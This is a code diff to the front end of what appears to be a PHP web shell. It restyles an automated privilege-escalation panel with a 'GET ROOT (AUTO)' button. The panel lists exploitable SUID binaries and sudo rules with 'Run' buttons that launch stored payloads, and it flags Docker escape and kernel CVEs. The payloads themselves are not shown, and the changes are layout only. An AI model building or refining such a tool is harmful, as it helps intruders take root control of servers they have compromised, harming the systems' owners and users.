@@ -2596,15 +2596,16 @@ function list_dir($path) {
             </div>
             
             <!-- Results Area -->
-            <div id="privescResults" style="min-height:100px;max-height:200px;overflow-y:auto;background:#0a0a0a;border:1px solid #0f0;border-radius:4px;padding:10px;margin-bottom:10px;">
-                <div style="text-align:center;padding:30px;color:#666;font-size:12px;">
-                    <span style="font-size:30px;">💀</span>
-                    <p style="margin:10px 0;">Click 🔥 GET ROOT (AUTO) to start</p>
-                </div>
+            <div id="privescResults" style="display:none;max-height:150px;overflow-y:auto;background:#0a0a0a;border:1px solid #0f0;border-radius:4px;padding:8px;margin-bottom:8px;font-size:11px;">
             </div>
             
-            <!-- Output Log -->
-            <div id="privescOutput" style="display:none;height:120px;overflow-y:auto;background:#000;border:1px solid #333;border-radius:4px;padding:8px;font-family:monospace;font-size:11px;white-space:pre-wrap;"></div>
+            <!-- Output Log (Main display area) -->
+            <div id="privescOutput" style="height:200px;overflow-y:auto;background:#000;border:1px solid #333;border-radius:4px;padding:8px;font-family:monospace;font-size:11px;white-space:pre-wrap;">
+                <div style="text-align:center;padding:20px;color:#666;">
+                    <span style="font-size:20px;">💀</span>
+                    <p style="margin:5px 0;font-size:11px;">Click 🔥 GET ROOT (AUTO) to start</p>
+                </div>
+            </div>
         </div>
     </div>
 </div>
@@ -3762,11 +3763,11 @@ async function scanPrivesc() {
     const vectorEmojis = { kernel: '🐛', suid: '⚡', sudo: '🔑', docker: '🐳' };
     
     // Reset UI
-    resultsDiv.innerHTML = '<div style="text-align:center;padding:20px;"><span style="font-size:24px;animation:pulse 1s infinite;">🔍</span><p style="color:#0f0;font-size:12px;margin-top:10px;">Scanning...</p></div>';
+    resultsDiv.style.display = 'none';
+    resultsDiv.innerHTML = '';
     statusDiv.style.display = 'block';
     statusDiv.innerHTML = '⏳ Scanning...';
-    outputDiv.style.display = 'block';
-    outputDiv.innerHTML = '';
+    outputDiv.innerHTML = '<div style="color:#6cf">🔍 Starting scan...</div>';
     
     const results = {};
     let foundCount = 0;
@@ -3821,16 +3822,19 @@ async function scanPrivesc() {
 }
 
 function displayPrivescResults(results) {
-    let html = '<div style="display:flex;flex-direction:column;gap:8px;">';
+    const resultsDiv = document.getElementById('privescResults');
+    let html = '<div style="display:flex;flex-direction:column;gap:6px;">';
+    let hasResults = false;
     
     // SUID Binaries - Compact
     if (results.suid && results.suid.exploitable.length > 0) {
-        html += '<div style="border:1px solid #f44;background:#2a0000;padding:8px;border-radius:4px;">';
-        html += '<div style="font-weight:bold;font-size:12px;color:#f44;margin-bottom:5px;">⚡ SUID (' + results.suid.exploitable.length + ')</div>';
+        hasResults = true;
+        html += '<div style="border:1px solid #f44;background:#2a0000;padding:6px;border-radius:4px;">';
+        html += '<div style="font-weight:bold;font-size:11px;color:#f44;margin-bottom:3px;">⚡ SUID (' + results.suid.exploitable.length + ')</div>';
         results.suid.exploitable.slice(0, 3).forEach(bin => {
-            html += '<div style="font-size:11px;margin:3px 0;display:flex;justify-content:space-between;align-items:center;">';
-            html += '<code style="background:#000;padding:2px 5px;border-radius:3px;">' + bin.binary + '</code>';
-            html += '<button onclick="runPrivescExploit(\'suid\', \'' + escapeHtml(bin.payload) + '\')" style="background:#f44;color:#fff;border:none;padding:2px 8px;border-radius:3px;font-size:10px;cursor:pointer;">Run</button>';
+            html += '<div style="font-size:10px;margin:2px 0;display:flex;justify-content:space-between;align-items:center;">';
+            html += '<code style="background:#000;padding:2px 4px;border-radius:3px;font-size:10px;">' + bin.binary + '</code>';
+            html += '<button onclick="runPrivescExploit(\'suid\', \'' + escapeHtml(bin.payload) + '\')" style="background:#f44;color:#fff;border:none;padding:2px 6px;border-radius:3px;font-size:9px;cursor:pointer;">Run</button>';
             html += '</div>';
         });
         html += '</div>';
@@ -3838,11 +3842,12 @@ function displayPrivescResults(results) {
     
     // Sudo Permissions - Compact
     if (results.sudo && results.sudo.exploitable.length > 0) {
-        html += '<div style="border:1px solid #0f0;background:#001a00;padding:8px;border-radius:4px;">';
-        html += '<div style="font-weight:bold;font-size:12px;color:#0f0;margin-bottom:5px;">🔑 SUDO (' + results.sudo.exploitable.length + ')</div>';
+        hasResults = true;
+        html += '<div style="border:1px solid #0f0;background:#001a00;padding:6px;border-radius:4px;">';
+        html += '<div style="font-weight:bold;font-size:11px;color:#0f0;margin-bottom:3px;">🔑 SUDO (' + results.sudo.exploitable.length + ')</div>';
         results.sudo.exploitable.slice(0, 2).forEach(sudo => {
-            html += '<div style="font-size:11px;margin:3px 0;">';
-            html += '<code style="background:#000;padding:2px 5px;border-radius:3px;">' + escapeHtml(sudo.payload.substring(0, 40)) + '...</code>';
+            html += '<div style="font-size:10px;margin:2px 0;">';
+            html += '<code style="background:#000;padding:2px 4px;border-radius:3px;font-size:10px;">' + escapeHtml(sudo.payload.substring(0, 35)) + '...</code>';
             html += '</div>';
         });
         html += '</div>';
@@ -3850,20 +3855,29 @@ function displayPrivescResults(results) {
     
     // Docker - Compact
     if (results.docker && results.docker.escape_possible) {
-        html += '<div style="border:1px solid #6cf;background:#001a2a;padding:8px;border-radius:4px;">';
-        html += '<div style="font-weight:bold;font-size:12px;color:#6cf;">🐳 Docker Escape</div>';
+        hasResults = true;
+        html += '<div style="border:1px solid #6cf;background:#001a2a;padding:6px;border-radius:4px;">';
+        html += '<div style="font-weight:bold;font-size:11px;color:#6cf;">🐳 Docker Escape</div>';
         html += '</div>';
     }
     
     // Kernel - Compact
     if (results.kernel && results.kernel.vulnerable) {
-        html += '<div style="border:1px solid #ff0;background:#2a2a00;padding:8px;border-radius:4px;">';
-        html += '<div style="font-weight:bold;font-size:12px;color:#ff0;">🐛 Kernel: ' + results.kernel.exploits.length + ' CVEs</div>';
+        hasResults = true;
+        html += '<div style="border:1px solid #ff0;background:#2a2a00;padding:6px;border-radius:4px;">';
+        html += '<div style="font-weight:bold;font-size:11px;color:#ff0;">🐛 Kernel: ' + results.kernel.exploits.length + ' CVEs</div>';
         html += '</div>';
     }
     
     html += '</div>';
-    document.getElementById('privescResults').innerHTML = html;
+    
+    if (hasResults) {
+        resultsDiv.innerHTML = html;
+        resultsDiv.style.display = 'block';
+    } else {
+        resultsDiv.style.display = 'none';
+        resultsDiv.innerHTML = '';
+    }
 }
 
 function updatePrivescStats(results) {
